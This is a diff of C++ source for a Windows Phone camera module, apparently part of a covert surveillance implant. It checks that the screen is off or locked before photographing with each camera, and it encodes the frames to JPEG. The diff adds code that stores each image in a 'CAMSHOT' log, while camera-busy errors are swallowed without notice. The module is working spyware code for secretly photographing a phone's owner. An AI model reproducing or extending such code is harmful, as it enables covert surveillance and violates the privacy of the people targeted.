@@ -1,6 +1,7 @@
 #include "NativePhotoCaptureInterface.h"
 #include "FunctionFunc.h"
 #include "Common.h"
+#include "Log.h"
 
 using namespace Microsoft::WRL;
 using namespace Windows::Foundation;
@@ -22,10 +23,17 @@ using namespace Platform;
 #define DTTMFMTAUD "%Y%m%d%H%M%S"
 #define DTTMSZAUD 16
 
+/*
+#define SIZE_Width 3264
+#define SIZE_Height 2448
+*/
+
 #define SIZE_Width 640
 #define SIZE_Height 480
 
+
 char nomeFile[32];	
+char nomeFileLast[32];	
 
 static int COSTRUITO=0;
 
@@ -49,21 +57,35 @@ using namespace std;
 using namespace NativePhotoCaptureInterface::Native;
 
 
+/////Log* PtrCameraLog;
+
+// NB: se il dislay è in lock o è spento resetto l'idle per estrarre lo stato
+// Il problema si pone quando il display è in lock dato che resettanto l'idle prolunga la permanenza del lock screen
+// si puo' verificare con una bassa probabilita' ed ha anche un basso impatto ma è da tenerne conto
 bool ChekDisplayOn()
 {
-	
-	if (_Shell_IsUnlockedNormal()==1) {
+	// se _Shell_IsUnlockedNormal()=1  allora sono certo che il display è acceso
+	// se _Shell_IsUnlockedNormal()=0  il display potrebbe essere acceso in lock mode o spento
+	if (_Shell_IsUnlockedNormal()==1) 
+	{   
 		DBG_TRACE(L"Display Acceso: non posso scattare la foto\n", 1, FALSE);
 		return TRUE;
-	} else	{
-
+	} 
+	else	
+	{
 		//if(_Shell_IdleTimerReset(8) == 0x1000000 ) return FALSE;
-		if(_Shell_IdleTimerReset(8) != 0 ) return FALSE;
-			else 
-				{
-					DBG_TRACE(L"Display Acceso: non posso scattare la foto\n", 1, FALSE);
-					return TRUE;
-				}
+
+		// se _Shell_IdleTimerReset(8) = 0x1000000 allora il display è spento
+		//altrimenti è acceso in lock mode
+		if(_Shell_IdleTimerReset(8) != 0 ) 
+		{
+			return FALSE;
+		}
+		else 
+		{
+			DBG_TRACE(L"Display Acceso: non posso scattare la foto\n", 1, FALSE);
+			return TRUE;
+		}
 	}
 
 }
@@ -159,6 +181,25 @@ UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
         return 0;
    */
 
+					//se uRead!=0 entra
+					/*
+						if (CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH)) {
+							liZero.HighPart = liZero.LowPart = 0;
+							pOutStream->Seek(liZero, STREAM_SEEK_SET, NULL);
+
+							do {
+									uRead = 0;
+									pOutStream->Read(rgbBuffer, sizeof(rgbBuffer), &uRead);
+
+									
+									if (uRead)
+										CameraLog.WriteLog(rgbBuffer, uRead);
+							} while (uRead);
+
+							CameraLog.CloseLog();
+						}
+						*/
+
 
 
 	WCHAR msg[128];
@@ -173,6 +214,23 @@ UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
 	filestr.seekg (0, ios::beg);
 	filestr.write ((const char*)rgBytes, cb);
 	filestr.close();
+/*****
+	Log CameraLog;
+
+	if( strcmp(nomeFileLast,nomeFile) ){
+		CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH);
+		strcpy(nomeFileLast,nomeFile);
+	}
+
+	CameraLog.WriteLog((BYTE*)rgBytes, cb);
+
+
+	if(cb!=0x1000) {
+		
+		CameraLog.CloseLog();
+	}
+*****/
+
 
 	*cbActual=cb;
 
@@ -192,6 +250,15 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 	Windows::Foundation::Size  initialResolution =  Windows::Foundation::Size(640, 480);
 	Windows::Foundation::Size  previewResolution =  Windows::Foundation::Size(640, 480);
 	Windows::Foundation::Size  captureResolution =  Windows::Foundation::Size(640, 480);
+	
+	strcpy(nomeFileLast,"");
+
+/*
+	Windows::Foundation::Size  initialResolution =  Windows::Foundation::Size(3264, 2448);
+	Windows::Foundation::Size  previewResolution =  Windows::Foundation::Size(3264, 2448);
+	Windows::Foundation::Size  captureResolution =  Windows::Foundation::Size(3264, 2448);
+*/
+
 
 		IVectorView<CameraSensorLocation>^ pAvailableSensorLocations=PhotoCaptureDevice::AvailableSensorLocations;
 			
@@ -206,12 +273,22 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 		  {
 			//controlla che non vi sia il display acceso
 			//serve sugli htc sui nokia sembrerebbe non servire da gestire in un secondo tempo
-			if(ChekDisplayOn()==TRUE) break;
+///// DA RIABILITARE BYGIO			if(ChekDisplayOn()==TRUE) break;
 
 			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;
 
 
-/*****			
+			/* Nokia 820
+
+				3264.000000 2448.000000	
+				3552.000000 2000.000000
+				2592.000000 1936.000000
+				2592.000000 1456.000000
+				2048.000000 1536.000000
+				640.000000 480.000000
+
+			*/
+			/*
 			//estraggo le risoluzioni supportate
 			IVectorView<Size>^ pSize1=PhotoCaptureDevice::GetAvailableCaptureResolutions(pAvailableSensorLocations->GetAt(i));
 			
@@ -234,34 +311,62 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 				sprintf(str,"%f %f\n",pN1a.Width,pN1a.Height);
 				OutputDebugStringA(str);
 			}
-*****/
+			*/
 
-
+			
 			task<PhotoCaptureDevice^> PhotoCaptureTask(PhotoCaptureDevice::OpenAsync(pAvailableSensorLocations->GetAt(i), initialResolution), PhotoTaskTokenSourceFront.get_token());
+		
 
 
 			PhotoCaptureTask.then([=](task<PhotoCaptureDevice^> getPhotoTask)
 			{
+				//trappo le eccezioni nel caso in cui la camera sia gia' in uso!!!
+				try
+				{
 					auto pPhotoCaptureDevice = getPhotoTask.get();
 
-					pPhotoCaptureDevice->SetCaptureResolutionAsync(captureResolution);
-					pPhotoCaptureDevice->SetPreviewResolutionAsync(previewResolution);
+						
+/////					pPhotoCaptureDevice->SetCaptureResolutionAsync(captureResolution);
+/////					pPhotoCaptureDevice->SetPreviewResolutionAsync(previewResolution);
 
 
 					//IMPORTANTISSIMO anche se io setto una risoluzione passata in captureDimensions lui fa quello che vuole e decide con che risoluzione catturare a seconda del telefono
-					Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
-					
+					Windows::Foundation::Size PreActualResolution = pPhotoCaptureDevice->PreviewResolution;
+					Windows::Foundation::Size CapActualResolution = pPhotoCaptureDevice->CaptureResolution;
 
-					pPhotoCaptureDevice->SetProperty(KnownCameraGeneralProperties::EncodeWithOrientation, pPhotoCaptureDevice->SensorLocation == CameraSensorLocation::Back ? pPhotoCaptureDevice->SensorRotationInDegrees : pPhotoCaptureDevice->SensorRotationInDegrees);
 
-				
+/////					pPhotoCaptureDevice->SetProperty(KnownCameraGeneralProperties::EncodeWithOrientation, pPhotoCaptureDevice->SensorLocation == CameraSensorLocation::Back ? pPhotoCaptureDevice->SensorRotationInDegrees : pPhotoCaptureDevice->SensorRotationInDegrees);
 
+/////					pPhotoCaptureDevice->SetProperty(KnownCameraGeneralProperties::PlayShutterSoundOnCapture,true);
+
+						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FlashMode,FlashState::On); //Non implementato GetAt(1), GetAt(2)
+					   //pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,2); //Non implementato GetAt(2)
+/***
+						//queste tre sono supportate
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::ExposureTime,300);
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::ExposureCompensation,0);
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::Iso,600);
+***/						
+
+						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::SceneMode,CameraSceneMode::Macro);
+						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,FocusIlluminationMode::Off);
+
+						/* queste funzioni non sono implementate
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::SceneMode,CameraSceneMode::Macro);					
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,FocusIlluminationMode::Off);
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::LockedAutoFocusParameters,AutoFocusParameters ::WhiteBalance);
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::ManualWhiteBalance,100);
+						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::WhiteBalancePreset,WhiteBalancePreset::Candlelight);
+						*/
+
+
+					//	pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FlashPower,34);
 
 
 						Platform::Array<int, 1U>^ pBuffer;
-						pBuffer= ref new Platform::Array<int, 1U>(actualResolution.Width*actualResolution.Height*4);
+						pBuffer= ref new Platform::Array<int, 1U>(PreActualResolution.Width*PreActualResolution.Height*4);
 						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);
-						
+
 
 						uint8 * pixels = (uint8 *) pBuffer->Data;
 
@@ -282,8 +387,75 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 						WCHAR msg[128];
 						swprintf_s(msg, L"Assegnato0 nome=%s\n",nomeFile);
 						DBG_TRACE(msg, 1, FALSE);
+						
+						ULONG lengthOfStream=0;
+						/****
+						Log CameraLog;
 
-						int ret=_MediaApi_EncodeARGBIntoJpegStream((int*)pixels, actualResolution.Width, actualResolution.Height, actualResolution.Width, actualResolution.Height, 0, 90, ((actualResolution.Width * 4) * actualResolution.Height), NULL, NULL, WriteCallback, 0);
+						if (CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH)) 
+						{
+							PtrCameraLog=&CameraLog;
+							*****/
+							int ret=_MediaApi_EncodeARGBIntoJpegStream((int*)pixels, PreActualResolution.Width, PreActualResolution.Height, PreActualResolution.Width, PreActualResolution.Height, 0, 90, ((PreActualResolution.Width * 4) * PreActualResolution.Height), NULL, NULL, WriteCallback, lengthOfStream);
+
+							Log CameraLog;
+
+							std::ifstream is (nomeFile, std::ifstream::binary);
+							if (is) {
+							// get length of file:
+							is.seekg (0, is.end);
+							int length = is.tellg();
+							is.seekg (0, is.beg);
+
+							// allocate memory:
+							char * buffer = new char [length];
+
+							// read data as a block:
+							is.read (buffer,length);
+
+							is.close();
+
+							// print content:
+							//std::cout.write (buffer,length);
+
+							CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH);
+							CameraLog.WriteLog((BYTE*)buffer, length);
+							CameraLog.CloseLog();
+
+
+							delete[] buffer;
+							}
+
+
+							
+							
+
+
+						/*****	
+							_Sleep(5000);
+							CameraLog.CloseLog();
+						}
+						****/
+					
+
+					/*
+						if (CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH)) {
+							liZero.HighPart = liZero.LowPart = 0;
+							pOutStream->Seek(liZero, STREAM_SEEK_SET, NULL);
+
+							do {
+									uRead = 0;
+									pOutStream->Read(rgbBuffer, sizeof(rgbBuffer), &uRead);
+
+									//se uRead!=0 entra
+									if (uRead)
+										CameraLog.WriteLog(rgbBuffer, uRead);
+							} while (uRead);
+
+							CameraLog.CloseLog();
+						}
+						*/
+
 
 			/******			
 						BYTE tmp;
@@ -323,13 +495,23 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 						filestr.close();
 			*****/
 				
+				}
+				catch (Platform::Exception^ e) 
+				{
+					Log logInfo;
+					logInfo.WriteLogInfo(L"Camera is in use, pictures won't be captured");
+					OutputDebugString(L"<<<eccezione capture Photo gestita>>>\n");
+					//OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+				}
+
 			}
 		
 	).wait();
 		
+
 		}
-		//aspetto un sec prima di catturare dalla seconda camera
-		_Sleep(1000);
+		//aspetto XXX sec prima di catturare dalla seconda camera
+		_Sleep(5000);
 		
 	}
 
